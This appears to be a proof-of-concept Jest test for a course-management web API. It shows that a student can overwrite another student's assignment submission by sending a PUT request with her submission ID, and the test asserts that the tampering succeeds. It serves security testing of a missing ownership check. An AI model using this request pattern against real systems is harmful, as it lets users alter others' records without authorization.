const supertest = require('supertest');
const {
  startFreshServer,
  stopServer,
  openDb,
  registerAny,
  createCourseAny,
  listUsersAny,
  addMemberAny,
  createAssignmentAny,
  createSubmissionAny,
  listSubmissionsAny,
} = require('../../_helpers');

describe('PoC: submission overwrite by changing submission_id', () => {
  let server;

  beforeAll(async () => {
    server = await startFreshServer();
  }, 20000);

  afterAll(async () => {
    await stopServer(server);
  });

  test('bob can overwrite alice submission because update route does not verify submission ownership', async () => {
    const teacher = server.agent;
    const alice = supertest.agent(server.baseUrl);
    const bob = supertest.agent(server.baseUrl);

    const uniq = `${Date.now()}_${Math.random().toString(16).slice(2, 8)}`;
    const teacherName = `teacher_submit_${uniq}`;
    const aliceName = `alice_submit_${uniq}`;
    const bobName = `bob_submit_${uniq}`;

    await registerAny(teacher, teacherName, 'pass123', 'Teacher Submit');
    await registerAny(alice, aliceName, 'pass123', 'Alice');
    await registerAny(bob, bobName, 'pass123', 'Bob');

    const db = openDb();
    try {
      const courseRes = await createCourseAny(teacher, 'Course Submit', 'Desc');
      const courseId =
        courseRes.body?.course?.course_id ||
        db.prepare('SELECT course_id FROM courses ORDER BY course_id DESC LIMIT 1').get().course_id;

      const usersRes = await listUsersAny(teacher);
      const users = usersRes.body?.users || db.prepare('SELECT * FROM users').all();

      const aliceUser = users.find((u) => u.username === aliceName);
      const bobUser = users.find((u) => u.username === bobName);

      expect(aliceUser).toBeTruthy();
      expect(bobUser).toBeTruthy();

      await addMemberAny(teacher, courseId, aliceUser.user_id, 'student');
      await addMemberAny(teacher, courseId, bobUser.user_id, 'student');

      const assignmentRes = await createAssignmentAny(
        teacher,
        courseId,
        'HW1',
        'Do it',
        '2099-12-31T23:59:59Z'
      );
      const assignmentId =
        assignmentRes.body?.assignment?.assignment_id ||
        db.prepare('SELECT assignment_id FROM assignments ORDER BY assignment_id DESC LIMIT 1').get().assignment_id;

      const submissionRes = await createSubmissionAny(
        alice,
        courseId,
        assignmentId,
        'Alice original submission'
      );
      const submissionId =
        submissionRes.body?.submission?.submission_id ||
        db.prepare('SELECT submission_id FROM submissions ORDER BY submission_id DESC LIMIT 1').get().submission_id;

      const overwriteRes = await bob
        .put(`/api/courses/${courseId}/assignments/${assignmentId}/submissions/${submissionId}`)
        .send({ content_text: 'BOB OVERWROTE THIS', attachment_upload_id: null });

      expect([200, 302]).toContain(overwriteRes.status);

      const listRes = await listSubmissionsAny(teacher, courseId, assignmentId);
      const submissions =
        listRes.body?.submissions ||
        db.prepare('SELECT * FROM submissions WHERE course_id=? AND assignment_id=?').all(courseId, assignmentId);

      const target = submissions.find((s) => s.submission_id === submissionId);

      expect(target).toBeTruthy();
      expect(target.student_id).toBe(aliceUser.user_id);
      expect(target.content_text).toBe('BOB OVERWROTE THIS');
    } finally {
      db.close();
    }
  });
});